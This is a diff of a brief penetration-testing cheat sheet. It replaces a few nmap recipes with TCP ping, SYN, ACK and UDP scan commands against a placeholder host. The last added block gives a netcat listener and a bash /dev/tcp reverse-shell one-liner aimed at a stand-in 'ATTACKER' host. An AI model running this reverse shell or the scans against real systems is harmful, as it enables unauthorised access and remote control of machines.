@@ -1,24 +1,25 @@
-XML (saved with -oX) to HTML
+TCP Pings
 ```
-xsltproc scan.xml -o scan.html
-```
-
-TCP SYN/ACK pings
-```
-sudo nmap -vv -PS22,80,443 -PA80,443 <IP> -sn -n
+sudo nmap -vv -sn -n -PS22,80,443 -PA80,443 HOST
 ```
 
-Slower/quieter SYN scan
+SYN Scan
 ```
-sudo nmap -vv -T2 --top-ports=20 -sS <IP> -Pn -n --disable-arp-ping
-```
-
-UDP probe
-```
-nmap -vv -sU -p <PORT> <IP> -Pn -n
+sudo nmap -vv -Pn -n --max-retries=2 --top-ports=20 -sS HOST
 ```
 
-Basic DNS enum
+ACK Scan
 ```
-nmap -vv --script=dns-nsid <IP>
+sudo nmap -vv -Pn -n --top-ports=20 -sA HOST
+```
+
+UDP Probe
+```
+sudo nmap -vv -Pn -n -sU -p PORT HOST
+```
+
+Bash Reverse Shell
+```
+nc -lvnp 4444
+bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
 ```
